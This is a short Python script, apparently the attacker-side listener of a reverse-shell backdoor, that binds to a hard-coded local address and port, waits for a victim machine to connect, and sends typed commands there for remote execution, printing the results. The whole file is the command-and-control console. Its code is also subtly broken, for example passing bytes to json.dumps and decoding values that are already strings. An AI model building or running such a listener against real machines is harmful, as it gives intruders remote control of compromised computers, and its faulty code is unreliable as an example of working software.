#!/usr/bin/python3
import socket
import json


class Listner:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listner.bind((ip,port))
        listner.listen(0)
        print("[+] Waiting for incomming connections")
        self.conn,addr = listner.accept()
        print("[+] Got a connection from",addr )

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.conn.send(json_data)

    def reliable_recieve(self):
        json_data = self.conn.recv(1024)
        return json.loads(json_data)

    def execute_remotely(self,command):
        self.reliable_send(command.encode('ascii'))
        return self.reliable_recieve().decode('ascii')

    def run(self):
        while(True):
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listner("192.168.1.7",1234)
my_listener.run()
